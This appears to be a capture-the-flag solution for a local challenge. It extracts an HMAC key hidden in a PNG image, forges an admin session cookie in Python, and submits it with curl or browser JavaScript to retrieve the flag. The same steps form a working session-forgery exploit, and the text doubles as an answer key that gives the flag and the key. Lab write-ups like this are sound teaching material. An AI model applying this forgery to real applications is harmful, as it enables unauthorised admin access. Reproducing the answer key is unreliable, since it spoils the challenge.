SOLUTION - Hidden Key Cookie Forge

1) Download the image:
   curl -sS http://localhost:5000/static/logo.png -o logo.png

2) Extract the PNG text chunk:
   strings logo.png | grep -i ctf_key
   # You will see: ctf_key\supersecret_hmac_key_12345

3) Craft signature for admin:
# main.py
import hmac, hashlib

key = "supersecret_hmac_key_12345"
username = "admin"

sig = hmac.new(key.encode(), username.encode(), hashlib.sha256).hexdigest()
print(sig)


Signature for admin: 86f96cbc74c32acdadde613a7b5a7c2c6f639d0283aa6c2341e5cfcbad4f82b3

4) Send request with cookie:
   curl -sS -H "Cookie: session=admin|86f96cbc74c32acdadde613a7b5a7c2c6f639d0283aa6c2341e5cfcbad4f82b3" http://localhost:5000/flag

   OR 

   Dev tools in browser (F12 -> Console):
   document.cookie = "session=admin|86f96cbc74c32acdadde613a7b5a7c2c6f639d0283aa6c2341e5cfcbad4f82b3; path=/";
   location.href = "/flag";


Expected response:
ISEP{You_f0und_th3_s3cr3t!}

Docker run commands:
docker build -t hiddenkeycookie .
docker run --rm --name hkctf -p 5000:5000 -e CTF_FLAG="ISEP{You_f0und_th3_s3cr3t!}" hiddenkeycookie
